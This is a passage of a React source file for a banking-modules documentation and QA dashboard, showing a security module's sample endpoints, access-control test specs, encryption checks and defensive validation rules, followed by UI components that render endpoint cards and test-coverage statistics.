            { id: 2, event: 'account_locked', ip: '192.168.1.100', customer_id: 'CUST001', timestamp: '2024-01-15T10:05:00Z', details: '5 consecutive failures' },
            { id: 3, event: 'suspicious_transfer', ip: '10.0.0.50', customer_id: 'CUST005', timestamp: '2024-01-15T11:00:00Z', details: 'Large amount to new beneficiary' }
          ],
          total: 3
        }, null, 2),
        statusCodes: '200 OK, 401 Unauthorized, 403 Non-Admin'
      },
      {
        method: 'POST',
        url: '/api/v1/security/test/access-control',
        description: 'Test broken access control / IDOR vulnerabilities',
        requestBody: JSON.stringify({
          tests: [
            { description: 'Access other customer account', url: '/api/v1/accounts/999', method: 'GET', auth_as: 'CUST001', expected: 403 },
            { description: 'Modify other customer profile', url: '/api/v1/customers/999', method: 'PUT', auth_as: 'CUST001', expected: 403 },
            { description: 'Access admin endpoint as user', url: '/api/v1/admin/users', method: 'GET', auth_as: 'CUST001', expected: 403 }
          ]
        }, null, 2),
        responseBody: JSON.stringify({
          test_name: 'Access Control (IDOR)',
          total_tests: 3,
          passed: 3,
          failed: 0,
          result: 'PASS',
          details: [
            { test: 'Access other customer account', expected: 403, actual: 403, result: 'PASS' },
            { test: 'Modify other customer profile', expected: 403, actual: 403, result: 'PASS' }
          ]
        }, null, 2),
        statusCodes: '200 OK (Test Report)'
      },
      {
        method: 'GET',
        url: '/api/v1/security/encryption/verify',
        description: 'Verify that sensitive data is encrypted at rest',
        requestBody: 'N/A',
        responseBody: JSON.stringify({
          checks: [
            { field: 'customer.password', table: 'customers', encrypted: true, algorithm: 'bcrypt', result: 'PASS' },
            { field: 'card.card_number', table: 'cards', encrypted: true, algorithm: 'AES-256', result: 'PASS' },
            { field: 'account.balance', table: 'accounts', encrypted: false, algorithm: 'N/A', result: 'N/A (not sensitive)' },
            { field: 'customer.aadhaar', table: 'customers', encrypted: true, algorithm: 'AES-256', result: 'PASS' }
          ],
          overall: 'PASS',
          tls_enabled: true,
          tls_version: 'TLSv1.3'
        }, null, 2),
        statusCodes: '200 OK, 403 Non-Admin'
      }
    ],
    validationRules: [
      'SQL Injection: All user inputs must use parameterized queries',
      'XSS: All outputs must be HTML-encoded, CSP headers enforced',
      'CSRF: All state-changing endpoints require CSRF token in header/cookie',
      'IDOR: All resource access validated against authenticated user ownership',
      'Encryption: Passwords hashed (bcrypt), PII encrypted (AES-256), TLS 1.3 in transit',
      'Rate Limiting: Login 5/min, Transfer 10/min, OTP 3/5min per IP',
      'Session: HttpOnly + Secure + SameSite cookies, 30-min idle timeout',
      'Audit: All security events logged with IP, timestamp, user agent, correlation ID'
    ]
  }
];

/* ───────────────────────────────────────────
   Sub-Components
   ─────────────────────────────────────────── */

function MethodBadge({ method }) {
  const colors = {
    GET: { bg: '#e8f5e9', color: '#2e7d32', border: '#a5d6a7' },
    POST: { bg: '#e3f2fd', color: '#1565c0', border: '#90caf9' },
    PUT: { bg: '#fff3e0', color: '#e65100', border: '#ffcc80' },
    DELETE: { bg: '#ffebee', color: '#c62828', border: '#ef9a9a' },
    PATCH: { bg: '#f3e5f5', color: '#6a1b9a', border: '#ce93d8' }
  };
  const style = colors[method] || { bg: '#f5f5f5', color: '#333', border: '#ccc' };

  return (
    <span style={{
      display: 'inline-block',
      padding: '2px 10px',
      borderRadius: '4px',
      fontSize: '11px',
      fontWeight: 700,
      fontFamily: 'monospace',
      backgroundColor: style.bg,
      color: style.color,
      border: `1px solid ${style.border}`,
      minWidth: '52px',
      textAlign: 'center'
    }}>
      {method}
    </span>
  );
}

function JsonBlock({ json, label }) {
  if (!json || json === 'N/A' || json.startsWith('N/A')) {
    return <span style={{ color: '#888', fontStyle: 'italic', fontSize: '12px' }}>{json || 'N/A'}</span>;
  }

  return (
    <div style={{ position: 'relative' }}>
      {label && <div style={{ fontSize: '10px', color: '#888', marginBottom: '2px', fontWeight: 600 }}>{label}</div>}
      <pre style={{
        background: '#1e1e2e',
        color: '#cdd6f4',
        padding: '10px 12px',
        borderRadius: '6px',
        fontSize: '11px',
        lineHeight: '1.5',
        overflow: 'auto',
        maxHeight: '300px',
        margin: 0,
        whiteSpace: 'pre-wrap',
        wordBreak: 'break-word'
      }}>
        {json}
      </pre>
    </div>
  );
}

function EndpointCard({ endpoint }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <div style={{
      border: '1px solid #e0e0e0',
      borderRadius: '8px',
      marginBottom: '12px',
      overflow: 'hidden',
      backgroundColor: '#fff',
      boxShadow: '0 1px 3px rgba(0,0,0,0.05)'
    }}>
      <div
        onClick={() => setExpanded(!expanded)}
        style={{
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          padding: '12px 16px',
          cursor: 'pointer',
          backgroundColor: expanded ? '#fafafa' : '#fff',
          transition: 'background-color 0.2s',
          borderBottom: expanded ? '1px solid #e0e0e0' : 'none'
        }}
      >
        <MethodBadge method={endpoint.method} />
        <code style={{ fontSize: '13px', fontWeight: 600, color: '#1a1a2e', flexShrink: 0 }}>{endpoint.url}</code>
        <span style={{ color: '#666', fontSize: '13px', flex: 1 }}>{endpoint.description}</span>
        <span style={{ fontSize: '16px', color: '#888', transition: 'transform 0.2s', transform: expanded ? 'rotate(180deg)' : 'rotate(0)' }}>
          \u25BC
        </span>
      </div>

      {expanded && (
        <div style={{ padding: '16px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
          <div>
            <JsonBlock json={endpoint.requestBody} label="REQUEST BODY" />
          </div>
          <div>
            <JsonBlock json={endpoint.responseBody} label="RESPONSE" />
          </div>
          <div style={{ gridColumn: '1 / -1' }}>
            <div style={{ fontSize: '10px', color: '#888', marginBottom: '4px', fontWeight: 600 }}>STATUS CODES</div>
            <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
              {endpoint.statusCodes.split(', ').map((code, i) => {
                const num = parseInt(code);
                let bg = '#e8f5e9';
                let color = '#2e7d32';
                if (num >= 400 && num < 500) { bg = '#fff3e0'; color = '#e65100'; }
                else if (num >= 500) { bg = '#ffebee'; color = '#c62828'; }
                else if (num >= 300) { bg = '#e3f2fd'; color = '#1565c0'; }
                return (
                  <span key={i} style={{
                    display: 'inline-block',
                    padding: '3px 8px',
                    borderRadius: '4px',
                    fontSize: '11px',
                    backgroundColor: bg,
                    color: color,
                    fontWeight: 500
                  }}>
                    {code}
                  </span>
                );
              })}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ───────────────────────────────────────────
   Main Component
   ─────────────────────────────────────────── */

function BankingModules() {
  const [activeModule, setActiveModule] = useState('registration');
  const [testCoverage, setTestCoverage] = useState({});
  const [loadingCoverage, setLoadingCoverage] = useState(false);

  useEffect(() => {
    fetchTestCoverage(activeModule);
  }, [activeModule]);

  const fetchTestCoverage = async (moduleId) => {
    setLoadingCoverage(true);
    try {
      const response = await fetch(`${API_BASE}/api/test-cases?module=${moduleId}`);
      if (response.ok) {
        const data = await response.json();
        const total = data.length;
        const pass = data.filter(t => t.status === 'pass').length;
        const fail = data.filter(t => t.status === 'fail').length;
        const notRun = data.filter(t => t.status === 'not_run').length;
        const blocked = data.filter(t => t.status === 'blocked').length;
        setTestCoverage({
          total,
          pass,
          fail,
          notRun,
          blocked,
          passRate: total > 0 ? ((pass / total) * 100).toFixed(1) : '0.0'
        });
      } else {
        setTestCoverage({ total: 0, pass: 0, fail: 0, notRun: 0, blocked: 0, passRate: '0.0' });
      }
    } catch {
      setTestCoverage({ total: 0, pass: 0, fail: 0, notRun: 0, blocked: 0, passRate: '0.0' });
    }
    setLoadingCoverage(false);
  };

  const mod = MODULES.find(m => m.id === activeModule);

  return (
    <div style={{ padding: '0' }}>
      {/* Page Header */}
      <div style={{
        background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)',
        color: '#fff',
        padding: '24px 28px',
        borderRadius: '12px',
        marginBottom: '20px'
      }}>
        <h2 style={{ margin: '0 0 6px', fontSize: '22px', fontWeight: 700 }}>Banking Modules</h2>
        <p style={{ margin: 0, fontSize: '14px', opacity: 0.8 }}>
          Explore all banking modules, API endpoints, request/response payloads, validation rules, and test coverage
        </p>
      </div>

      {/* Module Tabs */}
      <div style={{
        display: 'flex',
        gap: '4px',
        marginBottom: '20px',
        overflowX: 'auto',
        paddingBottom: '4px',
        borderBottom: '2px solid #e0e0e0'
      }}>
        {MODULES.map(m => (
          <button
            key={m.id}
            onClick={() => setActiveModule(m.id)}
            style={{
              padding: '10px 16px',
              border: 'none',
              borderBottom: activeModule === m.id ? '3px solid #1a73e8' : '3px solid transparent',
              backgroundColor: activeModule === m.id ? '#e8f0fe' : 'transparent',
              color: activeModule === m.id ? '#1a73e8' : '#555',
              cursor: 'pointer',
              fontWeight: activeModule === m.id ? 700 : 500,
              fontSize: '13px',
              whiteSpace: 'nowrap',
              borderRadius: '8px 8px 0 0',
              transition: 'all 0.2s',
              display: 'flex',
              alignItems: 'center',
              gap: '6px'
            }}
          >
            <span>{m.icon}</span>
            {m.label}
          </button>
        ))}
      </div>

      {/* Module Content */}
      {mod && (
        <div>
          {/* Module Description & Business Flow */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: '1fr 1fr',
            gap: '16px',
            marginBottom: '20px'
          }}>
            <div style={{
              background: '#fff',
              border: '1px solid #e0e0e0',
              borderRadius: '10px',
              padding: '20px',
              boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
            }}>
              <h3 style={{ margin: '0 0 10px', fontSize: '15px', color: '#1a1a2e' }}>Module Description</h3>
              <p style={{ margin: 0, fontSize: '13px', lineHeight: '1.7', color: '#444' }}>{mod.description}</p>
            </div>
            <div style={{
              background: '#fff',
              border: '1px solid #e0e0e0',
              borderRadius: '10px',
              padding: '20px',
              boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
            }}>
              <h3 style={{ margin: '0 0 10px', fontSize: '15px', color: '#1a1a2e' }}>Business Flow</h3>
              <div style={{
                background: '#f8f9fa',
                borderRadius: '6px',
                padding: '12px',
                fontSize: '12px',
                fontFamily: 'monospace',
                lineHeight: '1.8',
                color: '#333',
                overflowX: 'auto'
              }}>
                {mod.businessFlow.split(' --> ').map((step, i, arr) => (
                  <span key={i}>
                    <span style={{
                      display: 'inline-block',
                      background: '#e3f2fd',
                      border: '1px solid #bbdefb',
                      borderRadius: '4px',
                      padding: '2px 8px',
                      margin: '2px 0'
                    }}>
                      {step}
                    </span>
                    {i < arr.length - 1 && <span style={{ color: '#1a73e8', margin: '0 4px' }}> → </span>}
                  </span>
                ))}
              </div>
            </div>
          </div>

          {/* Test Coverage & DB Tables row */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: '2fr 1fr',
            gap: '16px',
            marginBottom: '20px'
          }}>
            {/* Test Coverage Summary */}
            <div style={{
              background: '#fff',
              border: '1px solid #e0e0e0',
              borderRadius: '10px',
              padding: '20px',
              boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
            }}>
              <h3 style={{ margin: '0 0 12px', fontSize: '15px', color: '#1a1a2e' }}>Test Coverage Summary</h3>
              {loadingCoverage ? (
                <div style={{ textAlign: 'center', padding: '16px', color: '#888' }}>Loading test data...</div>
              ) : (
                <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
                  <div style={coverageCardStyle('#e3f2fd', '#1565c0')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.total || 0}</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Total</div>
                  </div>
                  <div style={coverageCardStyle('#e8f5e9', '#2e7d32')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.pass || 0}</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Passed</div>
                  </div>
                  <div style={coverageCardStyle('#ffebee', '#c62828')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.fail || 0}</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Failed</div>
                  </div>
                  <div style={coverageCardStyle('#fff3e0', '#e65100')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.blocked || 0}</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Blocked</div>
                  </div>
                  <div style={coverageCardStyle('#f5f5f5', '#616161')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.notRun || 0}</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Not Run</div>
                  </div>
                  <div style={coverageCardStyle('#f3e5f5', '#6a1b9a')}>
                    <div style={{ fontSize: '24px', fontWeight: 700 }}>{testCoverage.passRate || '0.0'}%</div>
                    <div style={{ fontSize: '11px', opacity: 0.8 }}>Pass Rate</div>
                  </div>
                </div>
              )}
            </div>

            {/* Database Tables */}
            <div style={{
              background: '#fff',
              border: '1px solid #e0e0e0',
              borderRadius: '10px',
              padding: '20px',
              boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
            }}>
              <h3 style={{ margin: '0 0 12px', fontSize: '15px', color: '#1a1a2e' }}>Database Tables Used</h3>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                {mod.dbTables.map((table, i) => (
                  <div key={i} style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '8px 12px',
                    backgroundColor: '#f8f9fa',
                    borderRadius: '6px',
                    fontSize: '13px'
                  }}>
                    <span style={{ fontSize: '14px' }}>\u{1F4BE}</span>
                    <code style={{ fontWeight: 600, color: '#1a1a2e' }}>{table}</code>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Validation Rules */}
          {mod.validationRules && (
            <div style={{
              background: '#fff',
              border: '1px solid #e0e0e0',
              borderRadius: '10px',
              padding: '20px',
              marginBottom: '20px',
              boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
            }}>
              <h3 style={{ margin: '0 0 12px', fontSize: '15px', color: '#1a1a2e' }}>Validation Rules & Business Constraints</h3>
              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fill, minmax(380px, 1fr))',
                gap: '8px'
              }}>
                {mod.validationRules.map((rule, i) => (
                  <div key={i} style={{
                    display: 'flex',
                    alignItems: 'flex-start',
                    gap: '8px',
                    padding: '8px 12px',
                    backgroundColor: '#f8f9fa',
                    borderRadius: '6px',
                    borderLeft: '3px solid #1a73e8',
                    fontSize: '12px',
                    lineHeight: '1.5',
                    color: '#333'
                  }}>
                    <span style={{ color: '#1a73e8', fontWeight: 700, flexShrink: 0 }}>{i + 1}.</span>
                    {rule}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* API Endpoints */}
          <div style={{
            background: '#fff',
            border: '1px solid #e0e0e0',
            borderRadius: '10px',
            padding: '20px',
            boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#1a1a2e' }}>
                API Endpoints ({mod.endpoints.length})
              </h3>
              <div style={{ display: 'flex', gap: '8px' }}>
                {['GET', 'POST', 'PUT', 'DELETE'].map(method => {
                  const count = mod.endpoints.filter(e => e.method === method).length;
                  if (count === 0) return null;
                  return <MethodBadge key={method} method={method} />;
                })}
              </div>
            </div>
            {mod.endpoints.map((endpoint, i) => (
              <EndpointCard key={i} endpoint={endpoint} />
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

/* Helper */
function coverageCardStyle(bg, color) {
  return {
    flex: '1 1 80px',
    minWidth: '80px',
    textAlign: 'center',
    padding: '14px 10px',
    borderRadius: '8px',
    backgroundColor: bg,
    color: color
  };
}

export default BankingModules;
